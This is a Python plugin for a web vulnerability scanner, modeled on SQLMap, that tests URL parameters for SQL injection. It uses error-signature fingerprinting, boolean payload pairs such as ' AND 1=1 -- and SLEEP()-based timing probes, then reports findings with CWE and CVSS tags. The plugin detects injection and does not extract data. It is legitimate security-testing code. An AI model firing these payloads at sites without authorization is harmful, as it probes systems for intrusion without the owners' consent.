"""
SQLMap-Inspired Advanced Injection Engine v6.0.

Implements SQLMap methodology:
  1. Baseline Parameter Characterization
  2. DBMS Error Signature Fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
  3. Strict Dual-Boolean Differential Validation (`1=1` vs `1=2`)
  4. Scaled Multi-Round Time-Based Verification (3s, 5s, 2s delays)
  5. Empirical Evidence Capture

CWE-89 | CVSS 8.6 | OWASP A03:2021 Injection
"""

import time
import urllib.parse
from urllib.parse import urlparse, parse_qs
from core.http_client import get
from core.response_analyzer import get_baseline, diff_responses, detect_waf_block, calculate_confidence, make_finding
from core.deep_analyzer import classify_error_response

PLUGIN_CWE = 89
PLUGIN_CVSS = 8.6
PLUGIN_OWASP = "A03:2021 Injection"

DBMS_SIGNATURES = {
    "MySQL": ["you have an error in your sql syntax", "warning: mysql", "com.mysql.jdbc"],
    "PostgreSQL": ["postgresql", "pg_query", "unterminated quoted string", "syntax error at or near"],
    "MSSQL": ["microsoft sql", "unclosed quotation mark", "sql server", "conversion failed when converting"],
    "Oracle": ["ora-00933", "ora-06512", "ora-01756", "oracle error"],
    "SQLite": ["sqlite3", "sqlite_", "unrecognized token"],
}

BOOLEAN_PAIRS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1 --", "' AND 1=2 --"),
    ("1 AND 1=1", "1 AND 1=2"),
]

TIME_DELAYS = [3, 5, 2]  # Scaled delays to verify scaling behavior


class SQLMapInjectionEngine:
    """Advanced injection engine following SQLMap testing methodology."""

    def __init__(self, target_url: str):
        self.target_url = target_url

    def run_injection_pipeline(self) -> list:
        """Execute full injection testing pipeline."""
        findings = []
        baseline = get_baseline(self.target_url, get)

        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return findings

        for param in params:
            # ── 1. DBMS Error Fingerprinting ──
            err_finding = self._check_error_based(param, baseline)
            if err_finding:
                findings.append(err_finding)

            # ── 2. Dual-Boolean Differential Validation ──
            bool_finding = self._check_boolean_based(param, baseline)
            if bool_finding:
                findings.append(bool_finding)

            # ── 3. Scaled Time-Based Verification ──
            time_finding = self._check_time_based(param, baseline)
            if time_finding:
                findings.append(time_finding)

        return findings

    def _check_error_based(self, param: str, baseline: dict) -> dict:
        """Inject single quote and test for specific DBMS error signatures."""
        inj_url = self._craft_url(param, "'")
        try:
            r = get(inj_url, timeout=5)
            if r is None:
                return None
            blocked, _ = detect_waf_block(r)
            if blocked:
                return None

            body_lower = r.text.lower()
            detected_dbms = None
            evidence_str = ""

            for dbms, sigs in DBMS_SIGNATURES.items():
                for sig in sigs:
                    if sig in body_lower and sig not in baseline.get("text_lower", ""):
                        detected_dbms = dbms
                        evidence_str = sig
                        break
                if detected_dbms:
                    break

            if detected_dbms:
                # Negative control check (safe string)
                safe_url = self._craft_url(param, "safe_param_val_123")
                safe_r = get(safe_url, timeout=5)
                if safe_r and evidence_str in safe_r.text.lower():
                    return None  # False positive (error was already present in safe response)

                signals = {"error_string": True, "verified": True}
                confidence = calculate_confidence(signals)
                finding = make_finding(
                    self.target_url, f"SQL Injection ({detected_dbms} Error-Based)",
                    confidence=confidence, signals=signals,
                    details=f"SQLMap engine detected {detected_dbms} syntax error via param '{param}'.",
                    severity="Critical", payload="'",
                    evidence=f"DBMS Error signature: '{evidence_str}'",
                    parameter=param,
                )
                if finding:
                    finding["cwe"] = PLUGIN_CWE
                    finding["cvss"] = PLUGIN_CVSS
                    finding["owasp"] = PLUGIN_OWASP
                    return finding
        except Exception:
            pass
        return None

    def _check_boolean_based(self, param: str, baseline: dict) -> dict:
        """Strict dual-boolean test: TRUE query matches baseline, FALSE query differs."""
        for true_p, false_p in BOOLEAN_PAIRS:
            true_url = self._craft_url(param, true_p)
            false_url = self._craft_url(param, false_p)

            try:
                r_true = get(true_url, timeout=5)
                r_false = get(false_url, timeout=5)

                if not r_true or not r_false:
                    continue

                sim_true_base = diff_responses(baseline.get("text", ""), r_true.text)
                sim_true_false = diff_responses(r_true.text, r_false.text)

                # Strict SQLMap logic: True query matches baseline (>0.85), False query differs (<0.80)
                if sim_true_base > 0.85 and sim_true_false < 0.80:
                    signals = {"boolean_diff": True, "verified": True}
                    confidence = calculate_confidence(signals)
                    finding = make_finding(
                        self.target_url, "SQL Injection (Boolean-Based Blind)",
                        confidence=confidence, signals=signals,
                        details=f"Dual-boolean validation confirmed: TRUE query matches baseline ({sim_true_base:.2f}), FALSE query differs ({sim_true_false:.2f}).",
                        severity="Critical", payload=true_p,
                        evidence=f"TRUE/FALSE Differential: sim(T,F) = {sim_true_false:.2f}",
                        parameter=param,
                    )
                    if finding:
                        finding["cwe"] = PLUGIN_CWE
                        finding["cvss"] = PLUGIN_CVSS
                        finding["owasp"] = PLUGIN_OWASP
                        return finding
            except Exception:
                continue
        return None

    def _check_time_based(self, param: str, baseline: dict) -> dict:
        """Scaled multi-round time verification (3s, 5s, 2s)."""
        if baseline.get("elapsed", 0) > 2.0:
            return None  # Target already slow/unstable

        for delay in TIME_DELAYS:
            payload = f"' AND SLEEP({delay})-- "
            inj_url = self._craft_url(param, payload)
            try:
                start = time.time()
                r = get(inj_url, timeout=delay + 4)
                elapsed = time.time() - start

                if elapsed < (delay - 0.5):
                    return None  # Did not delay as expected

            except Exception:
                return None

        # All 3 delay rounds scaled as expected!
        signals = {"timing_anomaly": True, "verified": True}
        confidence = calculate_confidence(signals)
        finding = make_finding(
            self.target_url, "SQL Injection (Time-Based Blind)",
            confidence=confidence, signals=signals,
            details=f"Scaled time delay verification confirmed across 3 consecutive rounds (3s, 5s, 2s).",
            severity="Critical", payload="' AND SLEEP(5)-- ",
            evidence="Response delay scaled proportionally with SLEEP() parameter",
            parameter=param,
        )
        if finding:
            finding["cwe"] = PLUGIN_CWE
            finding["cvss"] = PLUGIN_CVSS
            finding["owasp"] = PLUGIN_OWASP
            return finding
        return None

    def _craft_url(self, param: str, val: str) -> str:
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [val]
        flat_params = {k: v[0] for k, v in params.items()}
        new_query = urllib.parse.urlencode(flat_params)
        return urllib.parse.urlunparse(parsed._replace(query=new_query))
